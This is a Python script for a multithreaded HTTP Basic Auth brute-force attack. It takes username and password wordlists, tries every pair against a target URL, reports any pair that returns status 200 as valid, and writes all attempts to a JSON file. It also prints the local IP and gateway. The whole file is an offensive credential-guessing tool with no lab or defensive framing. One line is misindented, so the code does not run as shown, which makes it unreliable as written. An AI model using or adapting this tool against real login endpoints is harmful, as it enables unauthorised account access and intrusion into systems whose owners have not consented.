import argparse
import json
import threading
import time
import socket
import os
from queue import Queue, Empty

import requests
from requests.auth import HTTPBasicAuth
from requests.exceptions import ConnectionError, Timeout


# ---------- helpers ----------

def load_list(path):
    if not path:
        return []
    try:
        with open(path, "r", encoding="utf-8") as f:
            return [x.strip() for x in f if x.strip()]
    except:
        return []


def password_stream(file):
    try:
        with open(file, "r", encoding="utf-8") as f:
            for line in f:
                p = line.strip()
                if p:
                    yield p
    except:
        return


def fix_url(url):
    if not url.startswith("http"):
        return "http://" + url
    return url


def reachable(session, url, timeout):
    try:
        r = session.get(url, timeout=timeout)
        return True, r.status_code
    except:
        return False, None


# ---------- NETWORK INFO ----------

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        print(f"📱 Local IP: {ip}")
    except:
        print("❌ Local IP not found")


def get_gateway_info():
    try:
        route = os.popen("ip route").read()
        for line in route.splitlines():
            if "default via" in line:
                parts = line.split()
                print(f"🚪 Gateway: {parts[2]} | 📡 {parts[4]}")
                return
        print("❌ Gateway not found")
    except:
        print("❌ Gateway error")


def run_network_info():
    print("\n===== NETWORK INFO =====")
    get_local_ip()
        get_gateway_info()
    print("========================\n")


# ---------- worker ----------

def worker(q, session, url, timeout, delay, results, success_list, lock, active):
    while True:
        try:
            user, password, idx, total = q.get(timeout=2)
        except Empty:
            return

        task = f"{user}:{password}"

        with lock:
            active.add(task)
            print(f"🟡 RUNNING [{idx}/{total}] {task}")

        try:
            r = session.get(url, auth=HTTPBasicAuth(user, password), timeout=timeout)
            status = r.status_code

            with lock:
                active.discard(task)
                print(f"🔵 DONE    [{idx}/{total}] {task} -> {status}")

            success = (status == 200)

            result = {
                "user": user,
                "password": password,
                "status": status,
                "success": success
            }

            results.append(result)

            if success:
                success_list.append(result)
                with lock:
                    print(f"\n✅ SUCCESS: {user}:{password}\n")

        except (ConnectionError, Timeout):
            with lock:
                active.discard(task)
                print(f"🔴 ERROR   [{idx}/{total}] {task}")

        finally:
            time.sleep(delay)
            q.task_done()


# ---------- feeder ----------

def feeder(q, users, passwords):
    idx = 1
    for p in passwords:
        for u in users:
            q.put((u, p, idx, "∞"))
            idx += 1

            if q.qsize() > 500:
                time.sleep(0.1)


# ---------- monitor ----------

def show_active(active, lock):
    while True:
        time.sleep(2)
        with lock:
            if active:
                print(f"\n🧠 ACTIVE ({len(active)}): {list(active)}\n")


# ---------- MAIN ----------

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--users", required=True)
    parser.add_argument("--passwords", required=True)
    parser.add_argument("--threads", type=int, default=3)
    parser.add_argument("--timeout", type=int, default=5)
    parser.add_argument("--delay", type=float, default=0.2)
    args = parser.parse_args()

    run_network_info()

    url = fix_url(args.url)

    users = load_list(args.users)

    if not users:
        print("❌ users file empty")
        return

    passwords = password_stream(args.passwords)

    session = requests.Session()

    ok, code = reachable(session, url, args.timeout)
    if not ok:
        print("❌ Target unreachable")
        return

    print(f"✅ Target reachable (Status {code})\n")

    q = Queue()
    results = []
    success_list = []
    active = set()
    lock = threading.Lock()

    # feeder thread
    threading.Thread(target=feeder, args=(q, users, passwords), daemon=True).start()

    # workers
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(
            target=worker,
            args=(q, session, url, args.timeout, args.delay, results, success_list, lock, active)
        )
        t.start()
        threads.append(t)

    # monitor
    threading.Thread(target=show_active, args=(active, lock), daemon=True).start()

    for t in threads:
        t.join()

    print("\n===== FINAL =====")

    if success_list:
        print(f"✅ Found {len(success_list)} valid:")
        for s in success_list:
            print(f"{s['user']} : {s['password']}")
    else:
        print("❌ No valid credentials")

    print("\n📄 Saving results.json")
    with open("results.json", "w") as f:
        json.dump(results, f, indent=2)


if __name__ == "__main__":
    main()
